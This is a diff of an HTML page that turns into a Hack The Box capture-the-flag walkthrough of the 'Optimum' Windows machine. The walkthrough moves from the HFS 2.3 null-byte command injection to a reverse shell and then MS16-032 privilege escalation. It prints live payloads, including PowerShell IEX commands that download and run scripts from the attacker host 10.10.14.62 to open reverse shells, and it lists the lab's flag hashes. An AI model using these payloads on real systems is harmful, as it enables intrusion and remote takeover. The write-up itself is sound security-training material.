@@ -1,50 +1,70 @@
-<!doctype html><html>
+<!DOCTYPE html>
+<html>
 <head>
-  <meta http-equiv="content-type" content="text/html; charset=utf-8">
-  <title>optimum</title>
-  <meta name="generator" content="CherryTree">
-  <link rel="stylesheet" href="styles.css" type="text/css" />
+<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
+<title>optimum</title>
+<meta content="CherryTree" name="generator"/>
+<link href="styles.css" rel="stylesheet" type="text/css"/>
 </head>
 <body><div class="main"><div class="tree">
 <p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
-<p><a href="HacktheBox--Windows_Boxes--optimum.html">optimum</a></p>
-
+<p><a href="#optimum">optimum</a></p>
 <ol>
-<li><a href="HacktheBox--Windows_Boxes--optimum--nmap.html">nmap</a></li>
-<li><a href="HacktheBox--Windows_Boxes--optimum--http.html">http</a></li>
+<li><a href="#nmap">nmap</a></li>
+<li><a href="#http">http</a></li>
 <ol>
-<li><a href="HacktheBox--Windows_Boxes--optimum--http--http_file_server_2.3_null_byte_exploit.html">http file server 2.3 null byte exploit</a></li>
-<li><a href="HacktheBox--Windows_Boxes--optimum--http--webpage_code_injection.html">webpage code injection</a></li>
+<li><a href="#http file server 2.3 null byte exploit">http file server 2.3 null byte exploit</a></li>
+<li><a href="#webpage code injection">webpage code injection</a></li>
 </ol>
-<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell.html">Powershell</a></li>
+<li><a href="#Powershell">Powershell</a></li>
 <ol>
-<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Nishang.html">Nishang</a></li>
+<li><a href="#Nishang">Nishang</a></li>
 <ol>
-<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Nishang--Invoke-PoweShellTcp.ps1.html">Invoke-PoweShellTcp.ps1</a></li>
-<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Nishang--run_powershell_on_victim_machine.html">run powershell on victim machine</a></li>
+<li><a href="#Invoke-PoweShellTcp.ps1">Invoke-PoweShellTcp.ps1</a></li>
+<li><a href="#run powershell on victim machine">run powershell on victim machine</a></li>
 <ol>
-<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Nishang--run_powershell_on_victim_machine--pre_URL_encode.html">pre URL encode</a></li>
+<li><a href="#pre URL encode">pre URL encode</a></li>
 </ol>
-<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Nishang--upload_to_HFS.html">upload to HFS</a></li>
+<li><a href="#upload to HFS">upload to HFS</a></li>
 <ol>
-<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Nishang--upload_to_HFS--reverse_shell.html">reverse shell</a></li>
-</ol>
-</ol>
-<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Sherlock.html">Sherlock</a></li>
-<ol>
-<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Sherlock--Sherlock_functions.html">Sherlock functions</a></li>
-<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Sherlock--report.html">report</a></li>
-<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--Sherlock--interesting_finds.html">interesting finds</a></li>
-</ol>
-<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--MS16-032.html">MS16-032</a></li>
-<ol>
-<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--MS16-032--Empire.html">Empire</a></li>
-<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--MS16-032--vi_MS16032.html">vi MS16032</a></li>
-<li><a href="HacktheBox--Windows_Boxes--optimum--Powershell--MS16-032--run_MS16-032_w-_reverse_shell.html">run MS16-032 w/ reverse shell</a></li>
+<li><a href="#reverse shell">reverse shell</a></li>
 </ol>
 </ol>
-<li><a href="HacktheBox--Windows_Boxes--optimum--user-root.html">user/root</a></li>
-<li><a href="HacktheBox--Windows_Boxes--optimum--lessons_learned.html">lessons learned</a></li>
+<li><a href="#Sherlock">Sherlock</a></li>
+<ol>
+<li><a href="#Sherlock functions">Sherlock functions</a></li>
+<li><a href="#report">report</a></li>
+<li><a href="#interesting finds">interesting finds</a></li>
+</ol>
+<li><a href="#MS16-032">MS16-032</a></li>
+<ol>
+<li><a href="#Empire">Empire</a></li>
+<li><a href="#vi MS16032">vi MS16032</a></li>
+<li><a href="#run MS16-032 w/ reverse shell">run MS16-032 w/ reverse shell</a></li>
+</ol>
+</ol>
+<li><a href="#user/root">user/root</a></li>
+<li><a href="#lessons learned">lessons learned</a></li>
 </ol></div>
-<div class="page"><h1><b><u>optimum</u></b></h1><img src="images/484-1.png" alt="images/484-1.png" /><br /><img src="images/484-2.png" alt="images/484-2.png" /></div></div>
-</body></html>
+<div class="page" id="optimum"><h1><b><u>optimum</u></b></h1><img alt="images/484-1.png" src="images/484-1.png"/><br/><img alt="images/484-2.png" src="images/484-2.png"/></div>
+<div class="page" id="nmap"><h1><b><u>nmap</u></b></h1><span style="color:#ffa500;">nmap -sV -sC -oA nmap/initial 10.10.10.8</span><br/><img alt="images/485-1.png" src="images/485-1.png"/><br/><span style="color:#24ff00;"> Only open port is port 80 hosting </span><span style="color:#ffa500;">HttpFileServer httpd 2.3</span></div>
+<div class="page" id="http"><h1><b><u>http</u></b></h1><img alt="images/397-1.png" src="images/397-1.png"/></div>
+<div class="page" id="http file server 2.3 null byte exploit"><h1><b><u>http file server 2.3 null byte exploit</u></b></h1><span style="color:#24ff00;">Quick google search on exploits shows a few vulnerabilities we can use:</span><br/><img alt="images/488-1.png" src="images/488-1.png"/><br/><img alt="images/488-2.png" src="images/488-2.png"/><br/><br/><img alt="images/488-3.png" src="images/488-3.png"/><br/><span style="color:#24ff00;">lets try adding a null byte on the webpage's searchbar for code execution:<br/><br/></span><span style="color:#ffa500;">%00{.exec|cmd.}</span><br/><img alt="images/488-4.png" src="images/488-4.png"/></div>
+<div class="page" id="webpage code injection"><h1><b><u>webpage code injection</u></b></h1><span style="color:#24ff00;">Lets start by pinging our attacking machine from the searchbar on optimum's webpage, lets also fire up </span><span style="color:#ffa500;">burpsuite</span><span style="color:#24ff00;"> to make things easier:<br/><br/>code: </span> <span style="color:#ffa500;">%00{.exec|ping 10.10.14.62.}</span><span style="color:#24ff00;"> <br/>then hit</span> <img alt="images/490-1.png" src="images/490-1.png"/><br/><img alt="images/490-2.png" src="images/490-2.png"/><br/><br/><span style="color:#24ff00;">we'll dump packets that communicate with our attack machine with </span><span style="color:#ffa500;">tcpdump</span> to verifiy if we recieve pings from our victim machine<br/><span style="color:#ffa500;">tcpdump -i tun0</span><br/><img alt="images/490-3.png" src="images/490-3.png"/></div>
+<div class="page" id="Powershell"><h1><b><u>Powershell</u></b></h1></div>
+<div class="page" id="Nishang"><h1><b><u>Nishang</u></b></h1><span style="text-decoration:underline;">First thing is to use Nishang Powershell to set up a reverse TCP shell</span><br/><br/>first thing is to copy the Invoke-PowerShellTcp.ps1 to our working directory<br/><br/><img alt="images/492-1.png" src="images/492-1.png"/></div>
+<div class="page" id="Invoke-PoweShellTcp.ps1"><h1><b><u>Invoke-PoweShellTcp.ps1</u></b></h1><h1>Here is the usage on how to set up the reverse shell:<br/></h1><img alt="images/494-1.png" src="images/494-1.png"/><br/><br/>Here is the function we call at the end of our ps1 script to have our target connect back to our attack machine:<br/><img alt="images/494-2.png" src="images/494-2.png"/><br/><br/></div>
+<div class="page" id="run powershell on victim machine"><h1><b><u>run powershell on victim machine</u></b></h1><span style="color:#24ff00;">note: the powershell.exe executable is often located in the location</span><br/><span style="color:#ffa500;">c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe </span><br/><br/><span style="color:#24ff00;">we're going to verify that by running powershell's </span><span style="color:#ffff00;">absolute location </span><span style="color:#24ff00;">through our victim's vulnerable, null-byte exploitable search function</span><br/><img alt="images/496-1.png" src="images/496-1.png"/></div>
+<div class="page" id="pre URL encode"><h1><b><u>pre URL encode</u></b></h1><span style="color:#24ff00;">we'll start by checking if we can run a simple </span><span style="color:#ffa500;">ping</span><span style="color:#24ff00;"> command with </span><span style="color:#ffa500;">powershell</span><br/><br/><span style="color:#ffa500;">%00{.exec|c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe ping 10.10.14.62}</span><br/><img alt="images/497-1.png" src="images/497-1.png"/><br/><br/>be sure to URL encode the code with CTRL+U<br/><img alt="images/497-2.png" src="images/497-2.png"/><br/><br/><span style="color:#24ff00;">setting up tcpdump to listen on our vpn tunnel for pings again, we see our victim is pinging us with powershell!</span><br/><img alt="images/497-3.png" src="images/497-3.png"/></div>
+<div class="page" id="upload to HFS"><h1><b><u>upload to HFS</u></b></h1><span style="color:#24ff00;">To upload our powershell to our victim machine, First set up an </span><span style="color:#ffa500;">http server</span><span style="color:#24ff00;">:</span><span style="text-decoration:underline;"><br/><br/></span><img alt="images/493-1.png" src="images/493-1.png"/><br/><br/><img alt="images/493-2.png" src="images/493-2.png"/><br/><br/><span style="color:#24ff00;">Use </span><span style="color:#ffa500;">Powershell.exe "IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.62:8000/Invoke-Powershell.ps1')</span><br/><br/><span style="color:#24ff00;">Pre URL Encoded:</span><br/><img alt="images/493-3.png" src="images/493-3.png"/><br/><br/><span style="color:#24ff00;">Post URL Encoded:</span><span style="color:#ffa500;"> CTRL+U</span><br/><img alt="images/493-4.png" src="images/493-4.png"/><br/><br/></div>
+<div class="page" id="reverse shell"><h1><b><u>reverse shell</u></b></h1><img alt="images/499-1.png" src="images/499-1.png"/><span style="color:#24ff00;"><br/>we see the request hits our http server<br/><br/></span><img alt="images/499-2.png" src="images/499-2.png"/><br/><br/>and we connect back to our machines from the victim computer running <span style="color:#ffa500;">Invoke-PowershellTcp.ps1</span><span style="color:#24ff00;">:<br/></span><img alt="images/499-3.png" src="images/499-3.png"/><br/><span style="color:#24ff00;">and we get a foothold as user </span><span style="color:#ffff00;">kostas</span><span style="color:#24ff00;">!</span><br/><img alt="images/499-4.png" src="images/499-4.png"/><h1><br/><br/></h1></div>
+<div class="page" id="Sherlock"><h1><b><u>Sherlock</u></b></h1><span style="color:#24ff00;">For this box, we're going to utilize a great powershell based </span><span style="color:#ffff00;">privilege escalation enumeration tool</span><span style="color:#24ff00;"> called </span><span style="color:#ffa500;">sherlock</span> <a href="https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1">here's the github for it</a><br/><br/><span style="color:#24ff00;">First thing is to move a copy of </span><span style="color:#ffa500;">Sherlock</span><span style="color:#24ff00;"> into our working directory:</span><br/><img alt="images/501-1.png" src="images/501-1.png"/><br/><br/><span style="color:#24ff00;">But before we want to upload it to our victim, there is a quick line of code we'll want to add to the bottom of the script to find vulnerabilities on our victim</span><br/><span style="color:#ffa500;">Find-AllVulns</span><br/><br/><br/><img alt="images/501-2.png" src="images/501-2.png"/><br/><img alt="images/501-3.png" src="images/501-3.png"/><br/><br/><br/><span style="color:#24ff00;">Now that our Sherlock script is ready to go, lets Host it via http with </span><span style="color:#ffa500;">SimpleHTTPServer</span><br/><span style="color:#ffa500;">python -m SimpleHTTPServer </span><br/><img alt="images/501-4.png" src="images/501-4.png"/><br/><br/><br/><span style="color:#24ff00;">And Download it to the victim with the powershell command:</span><br/><span style="color:#ffa500;">IEX(New-Object net.webclient).downloadstring('http://10.10.14.62/8000/Sherlock.ps1')</span><br/><img alt="images/501-5.png" src="images/501-5.png"/><br/><br/><br/></div>
+<div class="page" id="Sherlock functions"><h1><b><u>Sherlock functions</u></b></h1><span style="color:#24ff00;">For those interested, here is a list of all of </span><span style="color:#ffa500;">Sherlock's</span><span style="color:#24ff00;"> functions/tools, we're going to use them all with</span> <img alt="images/502-1.png" src="images/502-1.png"/><br/><br/><img alt="images/502-2.png" src="images/502-2.png"/></div>
+<div class="page" id="report"><h1><b><u>report</u></b></h1><span style="color:#24ff00;">the </span><span style="color:#ffa500;">IEX</span><span style="color:#24ff00;"> powershell command instantly runs the script we upload to our victim, and the output of the </span><span style="color:#ffa500;">Find-AllVulns</span><span style="color:#24ff00;"> scan provides the following report:</span><br/><img alt="images/504-1.png" src="images/504-1.png"/><br/><img alt="images/504-2.png" src="images/504-2.png"/><br/><br/><img alt="images/504-3.png" src="images/504-3.png"/><br/><br/><img alt="images/504-4.png" src="images/504-4.png"/></div>
+<div class="page" id="interesting finds"><h1><b><u>interesting finds</u></b></h1><span style="color:#24ff00;">ms16-135 appears vulnerable! <br/></span><img alt="images/505-1.png" src="images/505-1.png"/><br/>ms16-034 appears vulnerable!<br/><img alt="images/505-2.png" src="images/505-2.png"/><br/>ms16-032 appears vulnerable!<br/><img alt="images/505-3.png" src="images/505-3.png"/></div>
+<div class="page" id="MS16-032"><h1><b><u>MS16-032</u></b></h1><span style="color:#24ff00;">Since Sherlock reported that Optimum is vulnerable to </span><span style="color:#ffa500;">MS16-032</span><span style="color:#24ff00;">, lets look into using it</span> to escalate our <span style="color:#24ff00;">privileges</span><br/><img alt="images/506-1.png" src="images/506-1.png"/><br/><img alt="images/506-2.png" src="images/506-2.png"/><br/><br/><span style="color:#24ff00;">In my case, I downloaded </span><span style="color:#ffa500;">Empire</span><span style="color:#24ff00;"> off of </span><a href="https://github.com/EmpireProject/Empire">github</a><span style="color:#24ff00;"> and moved a copy of the MS16032 to my working file directory...</span><br/><img alt="images/506-3.png" src="images/506-3.png"/><br/><br/><img alt="images/506-4.png" src="images/506-4.png"/></div>
+<div class="page" id="Empire"><h1><b><u>Empire</u></b></h1><span style="color:#24ff00;">you can also copy over the raw sourcecode for </span><img alt="images/508-1.png" src="images/508-1.png"/> script <a href="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1">here</a><br/><img alt="images/508-2.png" src="images/508-2.png"/><br/><br/></div>
+<div class="page" id="vi MS16032"><h1><b><u>vi MS16032</u></b></h1><span style="color:#24ff00;">Before we upload and run our exploit, just like </span><span style="color:#ffa500;">nishang</span><span style="color:#24ff00;">, </span><span style="color:#ffa500;">sherlock</span><span style="color:#24ff00;"> and most </span><span style="color:#ffa500;">powershell scripts</span><span style="color:#24ff00;">, we'll have to add the function we want executed to the bottom of the script, for </span><span style="color:#ffa500;">Invoke-MS16032.ps1</span><span style="color:#24ff00;">, it's<br/></span><br/><img alt="images/509-1.png" src="images/509-1.png"/><br/><br/><span style="color:#ffa500;">Invoke-MS16-032 -Command "iex(new object net.webclient).downloadstring('http://10.10.14.62/8000/shell.ps1')"</span><br/><img alt="images/509-2.png" src="images/509-2.png"/><br/><span style="color:#24ff00;"><br/>We need to make a copy of our </span><span style="color:#ffa500;">Invoke-PowershellTcp.ps1</span><span style="color:#24ff00;"> script so </span><span style="color:#ffa500;">MS16-032 </span><span style="color:#24ff00;">can run it with </span><span style="color:#ffff00;">system privileges</span><span style="color:#24ff00;"> to call a reverse shell back to our attack machine</span><br/><img alt="images/509-3.png" src="images/509-3.png"/><br/><span style="color:#24ff00;">also, tweak the </span><span style="color:#ffa500;">Invoke-PowerShellTcp</span><span style="color:#24ff00;"> command to point to a different port number since we're already using port 4444 from our initial foothold</span><br/><img alt="images/509-4.png" src="images/509-4.png"/><br/><br/><br/><br/></div>
+<div class="page" id="run MS16-032 w/ reverse shell"><h1><b><u>run MS16-032 w/ reverse shell</u></b></h1><span style="color:#24ff00;">we'll need to spin up an </span><span style="color:#ffa500;">http server,</span><span style="color:#24ff00;"> set up a</span><span style="color:#ffa500;"> netcat listener </span><span style="color:#24ff00;">and make sure both our </span><span style="color:#ffa500;">Invoke-MS16032 </span><span style="color:#24ff00;">and </span><span style="color:#ffa500;">shell.ps1</span><span style="color:#24ff00;"> scripts are configured properly for </span><span style="color:#ffff00;">priv esc </span><span style="color:#24ff00;">to work</span><br/><img alt="images/510-1.png" src="images/510-1.png"/><br/><br/><span style="color:#24ff00;">spin up our http server with </span><span style="color:#ffa500;">python -m SimpleHTTPServer</span><span style="color:#24ff00;"> in our working directory</span><br/><img alt="images/510-2.png" src="images/510-2.png"/><br/><br/><span style="color:#24ff00;">almost there! just need to grab the exploit from our server and set up a listener on port 1337<br/></span><img alt="images/510-3.png" src="images/510-3.png"/><br/><br/><span style="color:#ffa500;">IEX (new-object net.webclient).downloadstring('http://10.10.14.62/8000/Invoke-MS16032.ps1')</span><br/><img alt="images/510-4.png" src="images/510-4.png"/><br/><br/>Hits the server and....<br/><img alt="images/510-5.png" src="images/510-5.png"/><br/><br/><span style="color:#24ff00;">we get a reverse shell call to our netcat listener that has</span><span style="color:#ffff00;"> system privileges</span><span style="color:#24ff00;">!</span><br/><img alt="images/510-6.png" src="images/510-6.png"/></div>
+<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/511-1.png" src="images/511-1.png"/><br/><span style="color:#ffff00;">d0c39409d7b994a9a1389ebf38ef5f73</span><h1></h1><img alt="images/511-2.png" src="images/511-2.png"/><br/><span style="color:#ffff00;">51ed1b36553c8461f4552c2e92b3eeed</span><br/></div>
+<div class="page" id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><img alt="images/1454-1.png" src="images/1454-1.png"/></div>
